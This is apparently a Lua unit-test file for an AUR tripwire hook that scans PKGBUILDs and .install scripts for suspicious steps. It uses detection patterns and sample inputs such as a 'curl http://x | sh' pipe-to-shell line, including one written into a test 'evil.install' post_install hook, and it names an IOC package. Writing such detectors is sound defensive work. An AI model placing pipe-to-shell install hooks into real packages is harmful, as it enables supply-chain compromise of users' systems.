-- Unit tests for yay-init.lua (the advisory AUR tripwire hook).
-- Run from the repo root: HOME=<prepared> lua tests/lua/test_yay_init.lua
-- The runner prepares HOME with an allowlist of: mailspring, *-electron.

local T = dofile("tests/helpers/lua_harness.lua")

-- Load the hook in test mode: stub the `yay` global and capture the callback.
_G.__YAY_TEST = true
local captured_cb
_G.yay = { create_autocmd = function(_, spec) captured_cb = spec.callback end }
local M = dofile("yay-init.lua")

-- glob_to_pat -------------------------------------------------------------
T.eq(M.glob_to_pat("a*b"), "^a.*b$", "glob_to_pat maps * and anchors")
T.eq(M.glob_to_pat("foo"), "^foo$", "glob_to_pat anchors a literal")

-- scan --------------------------------------------------------------------
T.ok(#M.scan("build(){ npm install x; }") > 0, "scan detects npm install")
T.ok(#M.scan("curl http://x | sh") > 0,        "scan detects pipe-to-sh")
T.ok(#M.scan("uses atomic-lockfile dep") > 0,  "scan detects an IOC name")
T.ok(#M.scan("NPM INSTALL FOO") > 0,           "scan is case-insensitive")
T.eq(#M.scan("echo hello world"), 0,           "scan clean text -> none")

-- is_allowed (ALLOW comes from the prepared HOME: mailspring, *-electron) --
T.ok(M.is_allowed("mailspring"),        "is_allowed exact match")
T.ok(M.is_allowed("foo-electron"),      "is_allowed glob match")
T.ok(not M.is_allowed("signal-desktop"),"is_allowed non-match")

-- load_allow with explicit paths -----------------------------------------
local tmp = os.tmpname()
local f = io.open(tmp, "w"); f:write("# comment\n\nfoo\n  bar  \n"); f:close()
local a = M.load_allow(tmp)
T.eq(#a, 2,      "load_allow skips comments/blank lines")
T.eq(a[1], "foo","load_allow keeps first entry")
T.eq(a[2], "bar","load_allow trims whitespace")
os.remove(tmp)

local absent = M.load_allow("/nonexistent/path/allowlist.txt")
T.eq(absent[1], "mailspring", "load_allow falls back when file is absent")

-- callback behavior -------------------------------------------------------
local function run_cb(event)
  local cap, real = "", io.stderr
  io.stderr = { write = function(_, s) cap = cap .. s end }
  captured_cb(event)
  io.stderr = real
  return cap
end

T.ok(run_cb({ match = "evilpkg", data = { pkgbuild = "build(){ npm install x; }" } }):find("WARNING"),
  "callback warns on a malicious PKGBUILD")
T.eq(run_cb({ match = "mailspring", data = { pkgbuild = "npm install x" } }), "",
  "callback skips an allowlisted package")
T.eq(run_cb({ match = "cleanpkg", data = { pkgbuild = "echo hi" } }), "",
  "callback is silent on a clean PKGBUILD")

-- callback discovers and scans the .install hook
local d = os.tmpname(); os.remove(d); os.execute("mkdir -p '" .. d .. "'")
local fi = io.open(d .. "/evil.install", "w")
fi:write("post_install(){ curl http://x | sh; }"); fi:close()
local out = run_cb({ match = "someaur", data = { pkgbuild = "install=evil.install\n", dir = d } })
T.ok(out:find("evil.install"), "callback scans the declared .install hook")
os.execute("rm -rf '" .. d .. "'")

os.exit(T.report("yay-init") and 0 or 1)
